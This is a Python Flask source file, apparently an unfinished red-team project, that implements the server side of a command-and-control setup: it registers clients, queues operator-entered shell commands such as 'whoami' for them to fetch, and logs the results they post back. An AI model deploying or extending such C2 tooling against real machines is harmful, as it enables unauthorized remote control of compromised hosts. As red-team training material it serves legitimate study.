from flask import Flask, request, jsonify, render_template
import requests

SERVER_URL = "http://127.0.0.1:5005"
app = Flask(__name__)
print("Drew was here")

#TODO: # client check in but only run if cmd changes

current_command = "whoami" # have something as the default command, just making sure that connection is maintained.
client_commands = {} # 'client_id': 'command' --> to handle commands for specific clients
clients = [] # just to see what clients we got rn

@app.route('/home')
def home():
    return render_template('home.html')


@app.route('/input-command', methods=['GET', 'POST'])
def input():
    if request.method == 'POST':
        global current_command
        current_command = request.form.get('command')
        print("!!!!!!!!!!current command:", current_command)
        return render_template('home.html', message="command received: "+str(current_command)) # i dont like this. NEED a return statement though


@app.route('/command', methods=['GET'])
def send_command():
    global current_command
    client_id = None # default

    # handle commands to specific clients
    # syntax: [command] [client_id]
    if len(current_command.split()) > 1: # if command was given w/ client arg
        # THIS WORKS
        cmd = current_command.split()[0]
        print("!!!!!!!!CMD: " + cmd)
        client_id = current_command.split()[1]
        print("!!!!!!!!! CLIENT_ID: "+ client_id)
        client_commands[client_id] = cmd
        print("!!!!!!!!!!!!!!!!!!   " + client_commands[client_id])
        # current_command = "whoami"
    else:
        # fix this
        cmd = current_command
        # current_command = "whoami"

    if client_id in client_commands: # if valid client id was parsed
        if cmd != client_commands[client_id]: # if not a repeat command
            return jsonify(status="sent", client_id=client_id, command=cmd) # send to a specific client
        return jsonify(status="sent", command=cmd) # otherwise send to all
    return jsonify(status="unsent", command="") # invalid client_id

@app.route('/register-client', methods=['GET'])
def register_client():
    print("register_client function")
    client_id = request.args.get('client_id')
    # client_id = "test"
    print(client_id)
    clients.append(client_id)
    client_commands[client_id] = "whoami"
    # return jsonify(client_id=client_id, command="hostname -I")
    return jsonify(status="client registered", client_id=client_id)


@app.route('/', methods=['POST']) # callbacks
def command_result():
    result = request.json.get('result') # GET from client
    # wtf is a result rename that
    status = request.args.get('status')
    print("!!!!!!!!!!client command result:\n" + result)
    # print(f"client is {status}") # hell yeah maybe put this somewhere else    or take it away altogether cause its in the POST header
    return jsonify({"status": "success"})

@app.route('/clients')
def show_clients():
    return clients


if __name__ == '__main__':
    # app.run(debug=True, host='0.0.0.0', port=5005, threaded=True, ssl_context=('/Users/leahk/workspace/projects/redteam/C2/cert.pem', '/Users/leahk/workspace/projects/redteam/C2/key.pem'))
    app.run(debug=True, host='0.0.0.0', port=5005, threaded=True)
    # app.run(host='127.0.0.1', port=5000, threaded=True)